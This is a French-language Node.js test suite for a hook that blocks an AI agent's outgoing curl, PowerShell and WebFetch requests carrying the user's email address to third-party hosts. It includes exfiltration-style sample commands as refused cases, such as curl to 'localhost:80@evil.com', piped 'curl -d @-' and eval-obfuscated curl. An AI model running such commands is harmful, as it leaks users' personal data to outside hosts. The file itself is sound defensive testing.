#!/usr/bin/env node
/**
 * hook-identite-sortante.test.mjs — R-62 portée par les outils qui émettent une requête (TF-1716).
 * Sens rouge : la forme exacte du 14/10/2026 (adresse de l'utilisateur dans `User-Agent` d'un appel à
 * une API publique) est REFUSÉE, sous curl, sous PowerShell et dans l'adresse d'un WebFetch ; une
 * adresse quelconque dans un en-tête User-Agent aussi. Sens vert : le REMÈDE que le refus propose
 * (en-tête neutre) passe, comme une requête locale, une commande qui n'émet rien, une adresse donnée
 * par l'utilisateur dans la conversation et la variable de demande consignée.
 * Joué par `oracles\self-tests.mjs` (I2).
 */
import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const HOOK = join(dirname(fileURLToPath(import.meta.url)), "hook-identite-sortante.mjs");
/** Le juge appelé directement, pour les formes de D-194 (b) : un processus par cas coûte plusieurs secondes sur ce poste. */
const JUGE = await import(pathToFileURL(HOOK).href);
let pass = 0, fail = 0;
const check = (nom, fn) => { try { fn(); console.log(`  [PASS] ${nom}`); pass++; } catch (e) { console.error(`  [FAIL] ${nom} — ${e.message}`); fail++; } };

// Une identité FICTIVE, déclarée par la variable ; git n'est pas lu, pour que le cas ne dépende pas du poste.
const MOI = "camille.essai@poste-fictif.fr";
const ENV = { ...process.env, FORGE_IDENTITES: MOI, FORGE_IDENTITES_SANS_GIT: "1" };
delete ENV.FORGE_IDENTITE_GO;
const T = mkdtempSync(join(tmpdir(), "idsort-"));
const jouer = (entree, env = ENV) => {
  const r = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: JSON.stringify(entree), env });
  return { code: r.status, out: (r.stdout || "") + (r.stderr || "") };
};
const bash = (command, extra = {}) => ({ tool_name: "Bash", cwd: T, tool_input: { command }, ...extra });
const API = "https://recherche-entreprises.api.gouv.fr/search?q=exemple";
const CAS_DU_14 = `curl -s -H "User-Agent: fiche-produit (${MOI})" "${API}"`;

check("rouge — le cas du 14/10 : l'adresse de l'utilisateur dans le User-Agent d'un appel curl à une API publique est refusée, R-62 nommée", () => {
  const r = jouer(bash(CAS_DU_14));
  if (r.code !== 2 || !/R-62/.test(r.out) || !/User-Agent/.test(r.out)) throw new Error(`exit ${r.code} : ${r.out}`);
  if (r.out.includes(MOI)) throw new Error("le motif recopie l'adresse en entier");
});
check("rouge (D-98) — l'adresse fournie par un tube à curl (`echo … | curl -d @- …`) est refusée, à tout étage amont", () => {
  for (const c of [`echo ${MOI} | curl -d @- "${API}"`, `echo ${MOI} | tr a-z A-Z | curl -d @- "${API}"`]) {
    const r = jouer(bash(c));
    if (r.code !== 2 || !/R-62/.test(r.out)) throw new Error(`${c} : exit ${r.code} : ${r.out}`);
  }
});
check("vert (D-98) — ce qui SUIT le client dans le tube n'est pas envoyé : `curl … | grep <adresse>` passe, et la commande voisine aussi", () => {
  for (const c of [`curl -s "${API}" | grep ${MOI}`, `git -c user.email=${MOI} commit -m x && curl -s "${API}"`]) {
    const r = jouer(bash(c));
    if (r.code !== 0) throw new Error(`${c} : exit ${r.code} : ${r.out}`);
  }
});
check("rouge (D-98) — un hôte propre déclaré ne couvre pas une organisation dont le nom commence pareil", () => {
  const env = { ...ENV, FORGE_HOTES_PROPRES: "dev.azure.com/mon-org" };
  const tiers = jouer(bash(`curl -d "m=${MOI}" https://dev.azure.com/mon-org-tiers/x`), env);
  if (tiers.code !== 2) throw new Error(`organisation tierce laissée passer : exit ${tiers.code}`);
  const propre = jouer(bash(`curl -d "m=${MOI}" https://dev.azure.com/mon-org/x`), env);
  if (propre.code !== 0) throw new Error(`l'hôte propre lui-même est refusé : exit ${propre.code} : ${propre.out}`);
});
check("rouge — la même adresse sous PowerShell (-UserAgent) et dans l'adresse d'un WebFetch est refusée", () => {
  const p = jouer({ tool_name: "PowerShell", cwd: T, tool_input: { command: `Invoke-RestMethod -Uri "${API}" -UserAgent "fiche (${MOI})"` } });
  if (p.code !== 2) throw new Error(`PowerShell : exit ${p.code} — ${p.out}`);
  const w = jouer({ tool_name: "WebFetch", cwd: T, tool_input: { url: `${API}&contact=${MOI}`, prompt: "liste" } });
  if (w.code !== 2) throw new Error(`WebFetch : exit ${w.code} — ${w.out}`);
});
check("rouge — une adresse quelconque dans un en-tête User-Agent est refusée, même si elle n'est pas connue du poste", () => {
  const r = jouer(bash(`curl -A "outil (dominique.tiers@autre-domaine.fr)" "${API}"`));
  if (r.code !== 2) throw new Error(`exit ${r.code} — ${r.out}`);
});
check("vert — le remède du refus : le même appel avec un en-tête neutre passe", () => {
  const r = jouer(bash(`curl -s -H "User-Agent: digit-ai-factory" "${API}"`));
  if (r.code !== 0) throw new Error(`exit ${r.code} — ${r.out}`);
});
check("vert — une requête vers la machine locale, et une commande qui n'émet aucune requête, passent", () => {
  const l = jouer(bash(`curl -H "User-Agent: test (${MOI})" http://localhost:8080/sante`));
  if (l.code !== 0) throw new Error(`locale : exit ${l.code} — ${l.out}`);
  const g = jouer(bash(`git -c user.email=${MOI} commit -m "x"`));
  if (g.code !== 0) throw new Error(`git commit : exit ${g.code} — ${g.out}`);
});
check("vert — l'adresse donnée par l'utilisateur dans la conversation vaut demande : l'appel passe", () => {
  const p = join(T, "transcript.jsonl");
  writeFileSync(p, [
    { type: "user", message: { role: "user", content: `Pour l'annuaire, mets mon adresse ${MOI} dans l'agent, ils la demandent.` } },
    { type: "assistant", message: { role: "assistant", content: [{ type: "text", text: "Entendu." }] } },
  ].map((e) => JSON.stringify(e)).join("\n") + "\n", "utf8");
  const r = jouer(bash(CAS_DU_14, { transcript_path: p }));
  if (r.code !== 0) throw new Error(`exit ${r.code} — ${r.out}`);
});
check("vert — la demande consignée par FORGE_IDENTITE_GO laisse passer ; sans elle, le même appel reste refusé", () => {
  const r = jouer(bash(CAS_DU_14), { ...ENV, FORGE_IDENTITE_GO: "demande du 15/10 pour l'annuaire" });
  if (r.code !== 0) throw new Error(`exit ${r.code} — ${r.out}`);
  if (jouer(bash(CAS_DU_14)).code !== 2) throw new Error("sans la variable, l'appel n'est plus refusé");
});
check("vert — un outil qui n'émet pas de requête (Read) n'est pas jugé", () => {
  if (jouer({ tool_name: "Read", tool_input: { file_path: MOI } }).code !== 0) throw new Error("Read jugé");
});
// D-194 (b) du 10/11/2026 : l'entrée illisible ne passe plus. Ce cas disait « une entrée illisible ne bloque pas » : la décision
// inverse l'attendu, elle ne l'assouplit pas.
check("rouge (D-194) — une entrée JSON malformée est refusée sans planter : exit 2, motif, aucune pile d'erreur", () => {
  for (const brut of ["pas du json", "", "[1, 2]", "{\"tool_name\": \"Bash\", "]) {
    const r = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: brut, env: ENV });
    if (r.status !== 2 || !/ENTRÉE ILLISIBLE, REQUÊTE REFUSÉE \(R-62, D-194 \(b\)\)/.test(r.stderr) || /at .*\.mjs:\d+/.test(r.stderr)) throw new Error(`${JSON.stringify(brut)} : exit ${r.status} : ${r.stderr.slice(0, 200)}`);
  }
});
// La panne se prouve sur une requête NEUTRE, qui passe quand le juge répond : seul le juge en panne peut la faire refuser.
const NEUTRE = `curl -s -H "User-Agent: digit-ai-factory" "${API}"`;
check("rouge (D-194) — panne du juge : une requête neutre est REFUSÉE (exit 2) ; avant, « une panne du juge ne bloque jamais un outil »", () => {
  const r = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: JSON.stringify(bash(NEUTRE)), env: { ...ENV, FORGE_GARDE_PANNE_ESSAI: "1" } });
  if (r.status !== 2 || !/GARDE EN PANNE, REQUÊTE REFUSÉE \(R-62, D-194 \(b\)\)/.test(r.stderr)) throw new Error(`exit ${r.status} : ${r.stderr.slice(0, 200)}`);
  const sansPanne = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: JSON.stringify(bash(NEUTRE)), env: ENV });
  if (sansPanne.status !== 0) throw new Error(`la requête neutre est refusée sans panne : exit ${sansPanne.status}`);
});
check("vert (D-194) — le réglage humain FORGE_GARDE_ILLISIBLE=laisse rétablit l'ancien comportement : entrée malformée et panne passent", () => {
  const env = { ...ENV, FORGE_GARDE_ILLISIBLE: "laisse" };
  const m = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: "pas du json", env });
  const p = spawnSync(process.execPath, [HOOK], { encoding: "utf8", input: JSON.stringify(bash(NEUTRE)), env: { ...env, FORGE_GARDE_PANNE_ESSAI: "1" } });
  if (m.status !== 0 || p.status !== 0) throw new Error(`malformée exit ${m.status}, panne exit ${p.status}`);
});

// D-194 (b) : les formes de la revue du 10/11 (juger() rejoué avec FORGE_IDENTITES posée rendait « laisse »). Appel direct du juge.
const direct = (entree, env = ENV) => JUGE.juger(entree, env);
const refuseI = async (entree, motif = /R-62/) => { const r = await direct(entree); if (r?.decision !== "refuse" || !motif.test(r.motif)) throw new Error(`laissé passer : ${JSON.stringify(r).slice(0, 220)}`); };
const passeI = async (entree, env = ENV) => { const r = await direct(entree, env); if (r?.decision !== "laisse") throw new Error(`refusé : ${String(r?.motif).slice(0, 220)}`); };
const ps = (command) => ({ tool_name: "PowerShell", cwd: T, tool_input: { command } });
const FORMES_194 = [
  [bash(`curl -A ${MOI} "http://localhost:80@evil.com/x"`), "l'hôte réel est après le dernier @ : localhost:80@evil.com vise evil.com"],
  [bash(`U=https://api.tiers.io; curl -A "bot ${MOI}" $U`), "l'adresse distante dans une variable de la commande (découpe sur « ; »)"],
  [bash(`curl -A "bot ${MOI}" api.tiers.io/x`), "une URL sans schéma, que curl envoie en http"],
  [bash(`curl -A "bot ${MOI}" ftp://api.tiers.io/x`), "le schéma ftp://"],
  [bash(`curl "https://api.tiers.io/x?contact=${MOI.replace("@", "%40")}"`), "l'adresse encodée (%40)"],
  [ps(`$h=@{"User-Agent"="${MOI}"}; Invoke-RestMethod -Uri https://api.tiers.io/x -Headers $h`), "l'en-tête dans une table PowerShell en variable"],
];
for (const [entree, nom] of FORMES_194) await (async () => { try { await refuseI(entree); console.log(`  [PASS] rouge (D-194) — ${nom} : refusé`); pass++; } catch (e) { console.error(`  [FAIL] rouge (D-194) — ${nom} — ${e.message}`); fail++; } })();
const checkA = async (nom, fn) => { try { await fn(); console.log(`  [PASS] ${nom}`); pass++; } catch (e) { console.error(`  [FAIL] ${nom} — ${e.message}`); fail++; } };
await checkA("rouge (D-194) — règle de famille : l'hôte ne se lit pas (variable inconnue), ou la commande est illisible et porte l'adresse", async () => {
  await refuseI(bash(`curl -A "bot ${MOI}" $U`), /hôte que la garde ne sait pas lire/);
  await refuseI(bash(`C='curl -A ${MOI} https://api.tiers.io/x'; eval "$C"`));
  await refuseI(bash(`git -c user.email=${MOI} commit -m "l'essai`), /D-194 \(b\)[^]*guillemets non équilibrés/);
  await refuseI({ tool_name: "WebFetch", cwd: T, tool_input: { url: `http://localhost:80@evil.com/x?c=${MOI}`, prompt: "x" } });
});
await checkA("vert (D-194) — lus et locaux, ou sans adresse : variable locale résolue, hôte local avec From, en-tête neutre, sortie vers un fichier", async () => {
  await passeI(bash(`U=http://localhost:3000; curl -A "${MOI}" $U`));
  await passeI(bash(`curl -s http://127.0.0.1:3000/x -H "From: ${MOI}"`));
  await passeI(bash(`curl -s -o out.json http://localhost:3000/x -A "${MOI}"`));
  await passeI(bash(`curl -s -H "User-Agent: digit-ai-factory" "${API}"`));
  await passeI(bash(`echo ${MOI} > note.txt`));
});
await checkA("vert (D-194) — le réglage humain FORGE_GARDE_ILLISIBLE=laisse lève la règle de famille ; une requête lisible vers un tiers reste refusée", async () => {
  await passeI(bash(`git -c user.email=${MOI} commit -m "l'essai`), { ...ENV, FORGE_GARDE_ILLISIBLE: "laisse" });
  const r = await direct(bash(CAS_DU_14), { ...ENV, FORGE_GARDE_ILLISIBLE: "laisse" });
  if (r.decision !== "refuse") throw new Error("le réglage a levé R-62 elle-même");
});

// TF-1978 (20/10/2026) : seule la requête est jugée, pas le reste de la commande.
const AZURE = "https://dev.azure.com/organisation-fictive/projet/_apis/git/repositories?api-version=7.1";
check("TF-1978 vert — la forme du 20/10 : un commit local à l'adresse de l'utilisateur, chaîné avant un curl sans adresse, passe", () => {
  const r = jouer(bash(`git -c user.email=${MOI} commit -q -m "essai" && curl -s -H "Authorization: Bearer $JETON" "${AZURE}"`));
  if (r.code !== 0) throw new Error(`exit ${r.code} — ${r.out}`);
});
check("TF-1978 rouge — l'adresse dans le segment qui émet reste refusée, même chaînée après un autre segment", () => {
  const r = jouer(bash(`cd /tmp ; curl -s -H "User-Agent: outil (${MOI})" "${API}"`));
  if (r.code !== 2) throw new Error(`exit ${r.code} — ${r.out}`);
});
check("TF-1978 rouge — un « ; » DANS un corps entre guillemets ne coupe pas la requête : l'adresse qui le suit est vue", () => {
  const r = jouer(bash(`curl -s -X POST "${API}" -d "nom=essai; contact=${MOI}"`));
  if (r.code !== 2) throw new Error(`exit ${r.code} — ${r.out}`);
});
check("TF-1978 vert — un hôte propre déclaré par FORGE_HOTES_PROPRES peut porter l'adresse ; un autre hôte, non", () => {
  const env = { ...ENV, FORGE_HOTES_PROPRES: "dev.azure.com/organisation-fictive" };
  const propre = jouer(bash(`curl -s -d "auteur=${MOI}" "${AZURE}"`), env);
  if (propre.code !== 0) throw new Error(`hôte propre : exit ${propre.code} — ${propre.out}`);
  const tiers = jouer(bash(`curl -s -d "auteur=${MOI}" "${API}"`), env);
  if (tiers.code !== 2) throw new Error(`hôte tiers : exit ${tiers.code} — ${tiers.out}`);
});

rmSync(T, { recursive: true, force: true });
console.log(`\nhook-identite-sortante (R-62, TF-1716) : ${pass} PASS, ${fail} FAIL`);
process.exit(fail ? 1 : 0);
